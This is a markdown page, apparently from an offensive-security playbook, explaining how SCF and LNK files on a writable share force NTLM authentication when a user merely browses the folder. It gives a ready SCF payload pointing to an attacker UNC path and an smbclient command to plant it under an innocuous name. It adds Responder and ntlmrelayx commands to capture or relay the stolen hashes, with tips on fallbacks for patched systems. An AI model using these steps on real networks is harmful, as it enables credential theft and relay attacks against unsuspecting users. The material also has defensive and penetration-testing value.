---
title: "SCF and LNK coercion: forcing authentication when a folder is browsed"
order: 1
description: "SCF and LNK files placed on a writable share can reference an icon or target by UNC path on an attacker host. When a user merely browses the folder in Explorer, the client resolves those references and authenticates to the attacker, capturing the NTLM hash or feeding an NTLM relay, with no file opened or executed."
keywords:
  - scf file
  - lnk file
  - unc path
  - responder
  - ntlm coercion
---

# SCF and LNK coercion

The most reliable share-poisoning technique needs no file to be opened or run: it fires when a user simply views the folder. Explorer resolves certain file attributes to render a folder, and if those attributes point at a UNC path on an attacker host, the client connects and authenticates there. SCF (Shell Command File) and LNK (shortcut) files both carry an icon reference; a Windows library/search-connector or a desktop.ini can do the same. Dropping such a file in a writable share means any user who browses the directory authenticates to the attacker, whose capture or relay turns that into the victim's NTLM hash or a relayed session.

## Plant the coercion file

```ini
; evil.scf  -- Explorer resolves IconFile via UNC on folder view
[Shell]
Command=2
IconFile=\\<attacker-ip>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# drop it where users browse (name it to sort to the top, e.g. a leading ~ or @)
smbclient //<t>/share -U 'user%pass' -c 'put evil.scf @readme.scf'
# an LNK with a UNC icon path achieves the same; set the icon location to \\attacker\x
# stand up capture/relay on the attacker host to receive the authentication:
responder -I eth0                              # capture NTLMv2 for offline cracking
impacket-ntlmrelayx -tf targets.txt -smb2support   # relay it to a signing-off host
```

When Explorer renders the folder, it fetches the icon from the UNC path, which makes the client perform SMB authentication to the attacker; the attacker captures the NTLMv2 response (crack offline) or relays it live to another host.

## Exploitation notes

- The trigger is folder browsing, not opening a file, which makes this far more reliable than macro or executable techniques: anyone who navigates to the share in Explorer fires it.
- The captured NTLMv2 is cracked offline if the password is weak, or relayed immediately to a host that does not require signing; pair with [signing and relay](../signing-and-relay.md).
- SCF icon coercion has been curtailed on patched/modern Windows in some contexts, so keep LNK (UNC icon), library/`.library-ms`, and `desktop.ini` variants as alternatives; the mechanism (UNC resolution on render) is the same.
- Name the file to sort first and look innocuous so it is rendered promptly; the credential captured is the browsing user's.

## Tools

- [Responder](https://github.com/lgandx/Responder)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
- [ntlm_theft (coercion file generator)](https://github.com/Greenwolf/ntlm_theft)

## References

- [MITRE ATT&CK: forced authentication](https://attack.mitre.org/techniques/T1187/)
- [MITRE ATT&CK: taint shared content](https://attack.mitre.org/techniques/T1080/)
